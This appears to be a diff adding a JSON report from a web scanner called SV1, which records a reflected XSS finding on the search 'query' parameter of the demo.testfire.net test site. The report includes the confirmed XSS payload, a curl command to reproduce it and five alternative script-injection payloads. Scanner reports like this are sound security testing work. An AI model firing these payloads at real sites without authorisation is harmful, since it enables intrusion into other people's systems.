@@ -1,0 +1,84 @@
+{
+  "tool": "SV1",
+  "author": "ee.zvz",
+  "version": "1.3.4",
+  "meta": {
+    "target": "https://demo.testfire.net/search.jsp?query=test",
+    "crawl": false,
+    "depth": 0,
+    "scanners": [
+      "xss",
+      "sqli"
+    ],
+    "time_based": false,
+    "union": true,
+    "replay": true,
+    "browser": true,
+    "stored": false,
+    "hidden": false,
+    "js": false,
+    "external_js": false,
+    "har": false,
+    "request": false,
+    "data": false,
+    "json": false,
+    "second_order": false,
+    "dump": false,
+    "spa": false,
+    "openapi": false,
+    "blind": false,
+    "ssrf": false,
+    "oob": "",
+    "fail_on": "none",
+    "scope": "",
+    "db": "",
+    "sarif": "",
+    "retest": false
+  },
+  "stats": {
+    "pages": 1,
+    "points": 1,
+    "requests": 35,
+    "errors": 0,
+    "verified": 1,
+    "confirmed": 1,
+    "replayed": 0,
+    "unverified": 0,
+    "fixed": 0,
+    "retest": false,
+    "duration_seconds": 46.54
+  },
+  "counts": {
+    "total": 1,
+    "by_severity": {
+      "HIGH": 1
+    },
+    "by_type": {
+      "XSS": 1
+    }
+  },
+  "findings": [
+    {
+      "kind": "XSS",
+      "severity": "HIGH",
+      "url": "https://demo.testfire.net/search.jsp",
+      "method": "GET",
+      "param": "query",
+      "payload": "<svg/onload=alert('sv1bcccfe46')>sv1bcccfe46",
+      "confidence": "CONFIRMED",
+      "evidence": "executed in chromium: alert:sv1bcccfe46",
+      "technique": "reflected/text",
+      "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
+      "artifact": "",
+      "curl": "curl -sS 'https://demo.testfire.net/search.jsp?query=%3Csvg%2Fonload%3Dalert%28%27sv1bcccfe46%27%29%3Esv1bcccfe46'",
+      "data": {},
+      "alternatives": [
+        "<img src=x onerror=alert('sv1bcccfe46')>sv1bcccfe46",
+        "<script>alert('sv1bcccfe46')</script>sv1bcccfe46",
+        "sv1bcccfe46\"><svg/onload=alert('sv1bcccfe46')>",
+        "sv1bcccfe46'><svg/onload=alert('sv1bcccfe46')>",
+        "sv1bcccfe46</title><svg/onload=alert('sv1bcccfe46')>"
+      ]
+    }
+  ]
+}
